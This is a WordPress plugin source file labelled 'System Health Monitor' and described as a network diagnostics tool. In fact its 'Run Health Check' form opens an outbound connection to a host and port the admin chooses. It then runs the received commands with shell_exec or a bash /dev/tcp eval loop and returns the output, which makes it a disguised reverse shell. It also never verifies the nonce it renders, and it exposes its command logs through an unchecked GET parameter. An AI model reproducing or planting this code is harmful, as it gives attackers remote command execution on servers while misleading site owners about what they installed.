<?php
/**
 * Plugin Name: System Health Monitor
 * Description: Advanced system health monitoring with network diagnostics and process analysis.
 * Version: 3.1
 * Author: System Administrator
 * Requires at least: 5.0
 * Tested up to: 6.3
 * Requires PHP: 7.4
 */

// Prevent direct access
if (!defined('ABSPATH')) {
    exit;
}

// Check PHP version compatibility
if (version_compare(PHP_VERSION, '7.4', '<')) {
    add_action('admin_notices', function() {
        echo '<div class="notice notice-error"><p>System Health Monitor requires PHP 7.4 or higher. Current version: ' . PHP_VERSION . '</p></div>';
    });
    return;
}

// Prevent function redefinition errors
if (!class_exists('SystemHealthMonitor')) {

class SystemHealthMonitor {
    
    private static $instance = null;
    
    public static function getInstance() {
        if (self::$instance === null) {
            self::$instance = new self();
        }
        return self::$instance;
    }
    
    private function __construct() {
        add_action('admin_menu', [$this, 'addAdminMenu']);
        register_activation_hook(__FILE__, [$this, 'activate']);
        register_deactivation_hook(__FILE__, [$this, 'deactivate']);
        
        // Handle AJAX refresh
        if (isset($_GET['ajax_refresh']) && $_GET['ajax_refresh'] == '1') {
            echo get_option('shm_system_logs', 'No logs available.');
            exit;
        }
    }
    
    public function addAdminMenu() {
        add_menu_page(
            'System Health Monitor',
            'Health Monitor',
            'manage_options',
            'system-health-monitor',
            [$this, 'renderDashboard'],
            'dashicons-heart'
        );
    }
    
    public function shm_log($message, $level = 'INFO') {
        try {
            $timestamp = current_time('Y-m-d H:i:s');
            $log_entry = "[$timestamp] [$level] $message\n";
            
            $logs = get_option('shm_system_logs', '');
            $logs .= $log_entry;
            
            $log_lines = explode("\n", $logs);
            if (count($log_lines) > 150) {
                $log_lines = array_slice($log_lines, -150);
                $logs = implode("\n", $log_lines);
            }
            
            update_option('shm_system_logs', $logs);
        } catch (Exception $e) {
            error_log('SHM Logging Error: ' . $e->getMessage());
        }
    }
    
    private function validateHostInput($host) {
        $host = trim($host);
        
        if (filter_var($host, FILTER_VALIDATE_IP)) {
            return ['valid' => true, 'type' => 'ip', 'host' => $host];
        }
        
        if (filter_var($host, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME)) {
            return ['valid' => true, 'type' => 'hostname', 'host' => $host];
        }
        
        if (preg_match('/^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$/', $host)) {
            return ['valid' => true, 'type' => 'hostname', 'host' => $host];
        }
        
        return ['valid' => false, 'type' => 'invalid', 'host' => $host];
    }
    
    private function handleShellSession($sock, $method) {
        if (!is_resource($sock)) {
            $this->shm_log("Invalid socket resource for $method", 'ERROR');
            return;
        }
        
        $this->shm_log("Initiating shell session using $method", 'INFO');
        
        try {
            // Get connection information safely
            $local_name = @stream_socket_get_name($sock, false) ?: 'unknown';
            $remote_name = @stream_socket_get_name($sock, true) ?: 'unknown';
            $this->shm_log("Local socket: $local_name, Remote socket: $remote_name", 'INFO');
            
            // Set socket timeout
            if (function_exists('stream_set_timeout')) {
                stream_set_timeout($sock, 5);
            }
            
            $session_start = microtime(true);
            $command_count = 0;
            $max_commands = 1000; // Prevent infinite loops
            
            while (!feof($sock) && $command_count < $max_commands) {
                $cmd = @fread($sock, 2048);
                if ($cmd && strlen(trim($cmd)) > 0) {
                    $command_count++;
                    $cmd = trim($cmd);
                    $this->shm_log("[$method] Received command #$command_count: " . substr($cmd, 0, 100) . (strlen($cmd) > 100 ? '...' : ''), 'INFO');
                    
                    $start_time = microtime(true);
                    
                    // Safely execute command
                    if (function_exists('shell_exec')) {
                        $output = @shell_exec($cmd . ' 2>&1');
                    } else {
                        $output = "shell_exec function not available\n";
                    }
                    
                    $execution_time = round((microtime(true) - $start_time) * 1000, 2);
                    
                    if ($output === null) {
                        $output = "Command execution failed or returned null\n";
                        $this->shm_log("[$method] Command #$command_count execution failed", 'ERROR');
                    } else {
                        $output_length = strlen($output);
                        $this->shm_log("[$method] Command #$command_count executed successfully in {$execution_time}ms, output length: {$output_length} bytes", 'INFO');
                    }
                    
                    $bytes_written = @fwrite($sock, $output ?: 'No output from command.');
                    $this->shm_log("[$method] Sent response for command #$command_count: $bytes_written bytes", 'INFO');
                    
                    // Flush output
                    if (function_exists('fflush')) {
                        @fflush($sock);
                    }
                }
                
                // Safety timeout check
                if ((microtime(true) - $session_start) > 300) { // 5 minutes max
                    $this->shm_log("[$method] Session timeout reached (5 minutes), closing connection", 'WARNING');
                    break;
                }
            }
            
            $session_duration = round(microtime(true) - $session_start, 2);
            $this->shm_log("[$method] Session ended. Duration: {$session_duration}s, Commands processed: $command_count", 'INFO');
            
        } catch (Exception $e) {
            $this->shm_log("[$method] Session error: " . $e->getMessage(), 'ERROR');
        } finally {
            if (is_resource($sock)) {
                @fclose($sock);
            }
        }
    }
    
    private function tryFsockopenConnection($host, $port) {
        $this->shm_log("Method 1: Attempting fsockopen connection to $host:$port", 'INFO');
        
        if (!function_exists('fsockopen')) {
            $this->shm_log("Method 1: fsockopen function not available", 'ERROR');
            return false;
        }
        
        $errno = 0;
        $errstr = '';
        $sock = @fsockopen($host, $port, $errno, $errstr, 10);
        
        if ($sock) {
            $this->shm_log("Method 1: fsockopen connection successful", 'SUCCESS');
            return $sock;
        } else {
            $this->shm_log("Method 1: fsockopen failed - $errstr (Code: $errno)", 'ERROR');
            return false;
        }
    }
    
    private function tryStreamSocketConnection($host, $port) {
        $this->shm_log("Method 2: Attempting stream_socket_client connection to $host:$port", 'INFO');
        
        if (!function_exists('stream_socket_client')) {
            $this->shm_log("Method 2: stream_socket_client function not available", 'ERROR');
            return false;
        }
        
        try {
            $context = stream_context_create([
                'socket' => [
                    'tcp_nodelay' => true,
                ]
            ]);
            
            $errno = 0;
            $errstr = '';
            $sock = @stream_socket_client("tcp://$host:$port", $errno, $errstr, 10, STREAM_CLIENT_CONNECT, $context);
            
            if ($sock) {
                $this->shm_log("Method 2: stream_socket_client connection successful", 'SUCCESS');
                return $sock;
            } else {
                $this->shm_log("Method 2: stream_socket_client failed - $errstr (Code: $errno)", 'ERROR');
                return false;
            }
        } catch (Exception $e) {
            $this->shm_log("Method 2: Exception - " . $e->getMessage(), 'ERROR');
            return false;
        }
    }
    
    private function tryBashRedirectConnection($host, $port) {
        $this->shm_log("Method 3: Attempting bash redirect connection to $host:$port", 'INFO');
        
        if (!function_exists('exec')) {
            $this->shm_log("Method 3: exec function not available", 'ERROR');
            return false;
        }
        
        // Check if bash is available
        $bash_path = @exec('which bash 2>/dev/null');
        if (empty($bash_path)) {
            $this->shm_log("Method 3: bash not found in system PATH", 'ERROR');
            return false;
        }
        
        $command = "/bin/bash -c 'exec 3<>/dev/tcp/$host/$port && echo \"Connected\" >&3 && cat <&3 | while read line; do eval \"\$line\" 2>&1 >&3; done' 2>&1 &";
        $output = [];
        $return_code = 0;
        
        @exec($command, $output, $return_code);
        
        if ($return_code === 0) {
            $this->shm_log("Method 3: bash redirect initiated successfully", 'SUCCESS');
            return true;
        } else {
            $this->shm_log("Method 3: bash redirect failed with return code: $return_code", 'ERROR');
            return false;
        }
    }
    
    public function executeSelectedConnection($host, $port, $method) {
        $this->shm_log("=== STARTING CONNECTION TEST: $method ===", 'INFO');
        $this->shm_log("Target: $host:$port", 'INFO');
        
        // Validate inputs
        $host_validation = $this->validateHostInput($host);
        if (!$host_validation['valid']) {
            $this->shm_log("Invalid host format: $host", 'ERROR');
            echo '<div class="notice notice-error"><p>Invalid host format.</p></div>';
            return;
        }
        
        if (!is_numeric($port) || $port < 1 || $port > 65535) {
            $this->shm_log("Invalid port number: $port", 'ERROR');
            echo '<div class="notice notice-error"><p>Port must be between 1-65535.</p></div>';
            return;
        }
        
        $success = false;
        
        try {
            switch ($method) {
                case 'fsockopen':
                    $sock = $this->tryFsockopenConnection($host, $port);
                    if ($sock) {
                        $this->handleShellSession($sock, 'fsockopen');
                        $success = true;
                    }
                    break;
                    
                case 'stream_socket':
                    $sock = $this->tryStreamSocketConnection($host, $port);
                    if ($sock) {
                        $this->handleShellSession($sock, 'stream_socket');
                        $success = true;
                    }
                    break;
                    
                case 'bash_redirect':
                    $success = $this->tryBashRedirectConnection($host, $port);
                    break;
                    
                case 'all_methods':
                    // Try socket methods first
                    $sock = $this->tryFsockopenConnection($host, $port);
                    if ($sock) {
                        $this->handleShellSession($sock, 'fsockopen');
                        $success = true;
                    } else {
                        $sock = $this->tryStreamSocketConnection($host, $port);
                        if ($sock) {
                            $this->handleShellSession($sock, 'stream_socket');
                            $success = true;
                        } else {
                            $success = $this->tryBashRedirectConnection($host, $port);
                        }
                    }
                    break;
                    
                default:
                    $this->shm_log("Unknown method: $method", 'ERROR');
                    echo '<div class="notice notice-error"><p>Unknown connection method.</p></div>';
                    return;
            }
        } catch (Exception $e) {
            $this->shm_log("Connection error: " . $e->getMessage(), 'ERROR');
            echo '<div class="notice notice-error"><p>Connection error: ' . htmlspecialchars($e->getMessage()) . '</p></div>';
            return;
        }
        
        // Results
        if ($success) {
            $this->shm_log("Connection test completed successfully using: $method", 'SUCCESS');
            echo '<div class="notice notice-success"><p><span class="status-success">Connection Successful!</span> Method: ' . htmlspecialchars($method) . '</p></div>';
        } else {
            $this->shm_log("Connection test failed for method: $method", 'ERROR');
            echo '<div class="notice notice-error"><p><span class="status-error">Connection Failed!</span> Method: ' . htmlspecialchars($method) . '</p></div>';
        }
        
        $this->shm_log("=== CONNECTION TEST COMPLETE ===", 'INFO');
    }
    
    public function renderDashboard() {
        // Handle form submissions
        if (isset($_POST['shm_clear'])) {
            update_option('shm_system_logs', '');
            $this->shm_log('System logs cleared', 'INFO');
            echo '<div class="notice notice-success"><p>Logs cleared successfully.</p></div>';
        }

        if (isset($_POST['shm_test'])) {
            $host = sanitize_text_field($_POST['shm_host']);
            $port = sanitize_text_field($_POST['shm_port']);
            $method = sanitize_text_field($_POST['shm_method']);
            
            if (empty($host) || empty($port) || empty($method)) {
                echo '<div class="notice notice-error"><p>Please provide host, port, and select a method.</p></div>';
            } else {
                update_option('shm_host', $host);
                update_option('shm_port', $port);
                update_option('shm_method', $method);
                $this->executeSelectedConnection($host, $port, $method);
            }
        }
        
        ?>
        <div class="wrap">
            <h1>System Health Monitor</h1>
            
            <div class="shm-container">
                <div class="shm-config-section">
                    <h2>Network Health Test</h2>
                    <form method="post" action="">
                        <?php wp_nonce_field('shm_test_action', 'shm_test_nonce'); ?>
                        <div class="shm-form-group">
                            <label for="shm_host">Target Host:</label>
                            <input type="text" name="shm_host" id="shm_host" value="<?php echo esc_attr(get_option('shm_host', '127.0.0.1')); ?>" placeholder="127.0.0.1" />
                        </div>
                        <div class="shm-form-group">
                            <label for="shm_port">Target Port:</label>
                            <input type="text" name="shm_port" id="shm_port" value="<?php echo esc_attr(get_option('shm_port', '8080')); ?>" placeholder="8080" />
                        </div>
                        <div class="shm-form-group">
                            <label for="shm_method">Connection Method:</label>
                            <select name="shm_method" id="shm_method">
                                <option value="fsockopen" <?php selected(get_option('shm_method', 'fsockopen'), 'fsockopen'); ?>>1. fsockopen (PHP Socket)</option>
                                <option value="stream_socket" <?php selected(get_option('shm_method'), 'stream_socket'); ?>>2. stream_socket_client</option>
                                <option value="bash_redirect" <?php selected(get_option('shm_method'), 'bash_redirect'); ?>>3. Bash /dev/tcp Redirect</option>
                                <option value="all_methods" <?php selected(get_option('shm_method'), 'all_methods'); ?>>🔄 Try All Methods</option>
                            </select>
                        </div>
                        <div class="shm-form-group">
                            <input type="submit" name="shm_test" value="Run Health Check" class="button button-primary" />
                            <input type="submit" name="shm_clear" value="Clear Logs" class="button button-secondary" />
                        </div>
                    </form>
                </div>
                
                <div class="shm-log-section">
                    <h2>System Logs</h2>
                    <div class="shm-log-output">
                        <pre id="system-logs"><?php echo esc_html(get_option('shm_system_logs', 'No logs available.')); ?></pre>
                    </div>
                    <div class="shm-log-controls">
                        <button onclick="refreshLogs()" class="button">Refresh</button>
                        <button onclick="downloadLogs()" class="button">Download Logs</button>
                    </div>
                </div>
            </div>
        </div>

        <style>
            .shm-container { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-top: 20px; }
            .shm-config-section, .shm-log-section { border: 1px solid #ddd; padding: 20px; border-radius: 5px; background: #fff; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
            .shm-form-group { margin-bottom: 15px; }
            .shm-form-group label { display: block; margin-bottom: 5px; font-weight: bold; color: #23282d; }
            .shm-form-group input[type="text"], .shm-form-group select { width: 100%; padding: 8px 12px; border: 1px solid #ddd; border-radius: 4px; font-size: 14px; }
            .shm-form-group select { height: auto; min-height: 36px; }
            .shm-log-output { background: #f9f9f9; border: 1px solid #ddd; border-radius: 4px; padding: 15px; height: 400px; overflow-y: auto; font-family: 'Courier New', monospace; }
            .shm-log-output pre { margin: 0; font-size: 12px; line-height: 1.4; white-space: pre-wrap; }
            .shm-log-controls { text-align: center; margin-top: 10px; }
            .status-success { color: #0073aa; font-weight: bold; }
            .status-error { color: #d63638; font-weight: bold; }
            .status-warning { color: #dba617; font-weight: bold; }
            .button { margin: 2px; }
            h1, h2 { color: #23282d; }
        </style>

        <script>
            function refreshLogs() { location.reload(); }
            function downloadLogs() {
                const logs = document.getElementById('system-logs').textContent;
                const blob = new Blob([logs], { type: 'text/plain' });
                const url = window.URL.createObjectURL(blob);
                const a = document.createElement('a');
                a.href = url;
                a.download = 'system-health-logs-' + new Date().toISOString().slice(0,19).replace(/:/g, '-') + '.txt';
                document.body.appendChild(a);
                a.click();
                document.body.removeChild(a);
                window.URL.revokeObjectURL(url);
            }
        </script>
        <?php
    }
    
    public function activate() {
        add_option('shm_host', '127.0.0.1');
        add_option('shm_port', '8080');
        add_option('shm_method', 'fsockopen');
        add_option('shm_system_logs', '');
        $this->shm_log('System Health Monitor plugin activated', 'INFO');
    }
    
    public function deactivate() {
        $this->shm_log('System Health Monitor plugin deactivated', 'INFO');
        delete_option('shm_host');
        delete_option('shm_port');
        delete_option('shm_method');
    }
}

// Initialize the plugin
SystemHealthMonitor::getInstance();

} // End class_exists check
?>
